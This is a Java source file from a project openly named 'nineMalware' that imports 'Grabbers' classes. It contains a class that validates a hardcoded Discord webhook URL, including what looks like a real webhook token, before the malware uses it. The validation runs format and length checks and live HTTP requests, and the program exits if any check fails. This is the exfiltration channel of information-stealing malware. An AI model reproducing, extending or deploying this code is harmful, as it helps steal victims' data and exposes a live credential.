package me.ferrioz.nineMalware.Connection.Discord;

import me.ferrioz.nineMalware.Grabbers.Internet.getHTTPSpecifics;
import me.ferrioz.nineMalware.Utils.debugLogger;

import static me.ferrioz.nineMalware.Grabbers.Internet.getHTTPSpecifics.*;

public class verifyWebhook {

    public static String URL = "https://discord.com/api/webhooks/980908525003866112/y3ZoZ94Uw9o1psPJTkkbYN5Gc6Adsomb855i_RMg6aet_mwOu_LGNm5283hh4nV1oMbL";

    private void check_1() {
        debugLogger logger = new debugLogger();
        if(!URL.startsWith("https://discord.com/api/webhooks/")) {
            logger.addMSG("Failed URL validity check 1");
            System.exit(-423);
        }
        else {
            logger.addMSG("URL passed 1 / 5 checks");
        }
    }

    private void check_2() {
        debugLogger logger = new debugLogger();
        if(URL.endsWith("https://discord.com/api/webhooks/")) {
            logger.addMSG("Failed URL validity check 2");
            System.exit(-420);
        }
        else {
            logger.addMSG("URL passed 2 / 5 checks");
        }
    }

    private void check_3() {
        debugLogger logger = new debugLogger();
        if(URL.length() < 120) {
            logger.addMSG("Failed URL validity check 3");
            System.exit(-410);
        }
        else {
            logger.addMSG("URL passed 3 / 5 checks");
        }
    }

    private void check_4() {
        debugLogger logger = new debugLogger();
        getHTTPSpecifics.getHTTPSpecs(URL);
        if(statusCode == 200 && responseMSG.equals("OK")) {
            logger.addMSG("URL passed 4 / 5 checks");
        }
        else {
            logger.addMSG("Failed URL validity check 4");
            System.exit(-422);
        }
    }

    private void check_5() {
        debugLogger logger = new debugLogger();
        getHTTPSpecifics.getHTTPSpecs(URL);
        if(contentLength != -1) {
            logger.addMSG("Failed URL validity check 4");
            System.exit(-11);
        }
        else {
            logger.addMSG("URL passed 5 / 5 checks");
        }
    }

    public void runChecks() {
        debugLogger logger = new debugLogger();
        check_1();
        check_2();
        check_3();
        check_4();
        check_5();
        logger.addMSG("Success");

    }


}
